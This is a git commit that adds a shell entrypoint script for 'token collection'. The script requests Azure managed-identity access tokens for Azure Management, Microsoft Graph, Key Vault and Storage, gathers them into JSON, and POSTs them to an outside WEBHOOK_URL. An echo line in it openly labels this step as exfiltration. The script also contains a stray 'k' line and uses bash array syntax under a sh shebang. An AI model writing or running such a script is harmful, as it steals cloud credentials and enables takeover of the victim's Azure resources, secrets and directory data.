151dc6310952b6a5f2287276a9848da0b5c9dc6d
Jacob H <99051071+Jacob-Ham@users.noreply.github.com>
2026-01-06 09:22:15 -0500

    Add entrypoint script for token collection

---
+++ entrypoint.sh
@@ -0,0 +1,33 @@
+#!/bin/sh
+
+if [ -z "$WEBHOOK_URL" ]; then
+    echo "Error: WEBHOOK_URL environment variable is not set."
+    exit 1
+fi
+
+RESOURCES=(
+    "https://management.azure.com/"
+    "https://graph.microsoft.com/"
+    "https://vault.azure.net"
+    "https://storage.azure.com"
+)
+
+OUTPUT_JSON="{}"
+
+echo "Starting token collection from $IDENTITY_ENDPOINT..."
+
+for R in "${RESOURCES[@]}"; do
+
+    RESPONSE=$(curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
+        "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=$R")
+
+
+    TOKEN=$(echo "$RESPONSE" | jq -r '.access_token // .message')
+
+
+    OUTPUT_JSON=$(echo "$OUTPUT_JSON" | jq --arg key "$R" --arg val "$TOKEN" '.[$key] = $val')
+done
+
+k
+echo "Exfiltrating to $WEBHOOK_URL..."
+curl -s -X POST -H "Content-Type: application/json" -d "$OUTPUT_JSON" "$WEBHOOK_URL"
